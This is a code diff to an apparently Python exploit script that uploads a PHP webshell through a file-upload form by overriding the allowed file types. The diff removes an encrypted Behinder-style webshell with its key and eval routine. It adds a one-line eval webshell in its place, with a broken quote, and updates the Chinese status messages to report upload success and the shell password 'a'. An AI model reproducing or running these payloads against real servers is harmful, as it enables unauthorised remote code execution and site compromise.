@@ -5,6 +5,7 @@ import multiprocessing
 import urllib3
 from rich.console import Console
 
+proxies={'http':'http://127.0.0.1:8080'}
 console = Console()
 def now_time():
     return time.strftime("[%H:%M:%S] ", time.localtime())
@@ -43,32 +44,7 @@ Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
 Content-Disposition: form-data; name="ffff"; filename="test.php"
 Content-Type: application/octet-stream
 
-<?php
-@error_reporting(0);
-session_start();
-    $key="e45e329feb5d925b"; //rebeyond
-	$_SESSION['k']=$key;
-	session_write_close();
-	$post=file_get_contents("php://input");
-	if(!extension_loaded('openssl'))
-	{
-		$t="base64_"."decode";
-		$post=$t($post."");
-		
-		for($i=0;$i<strlen($post);$i++) {
-    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
-    			}
-	}
-	else
-	{
-		$post=openssl_decrypt($post, "AES128", $key);
-	}
-    $arr=explode('|',$post);
-    $func=$arr[0];
-    $params=$arr[1];
-	class C{public function __invoke($p) {eval($p."");}}
-    @call_user_func(new C(),$params);
-?>
+<?php eval($_REQUEST['a]);?>
 -----------------------------55719851240137822763221368724
 Content-Disposition: form-data; name="mufile"
 
@@ -85,7 +61,7 @@ submit
             console.print(now_time() + ' [SUCCESS]  上传webshell成功，检测wbshell中:{}'.format(exp_url), style='bold green')
             response=requests.get(exp_url, headers=headerx, verify=False)
             if response.status_code == 200:
-                console.print(now_time() + ' [SUCCESS]  webshell检测成果,冰蝎默认密码:{}'.format(exp_url), style='bold green')
+                console.print(now_time() + ' [SUCCESS] 一句话webshell默认密码为a:{}'.format(exp_url), style='bold green')
             else:
                 console.print(now_time() + ' [WARNING]  webshell失效了可能原因被防火墙阻拦，请手动检测:{}'.format(exp_url), style='bold red ')
         else:
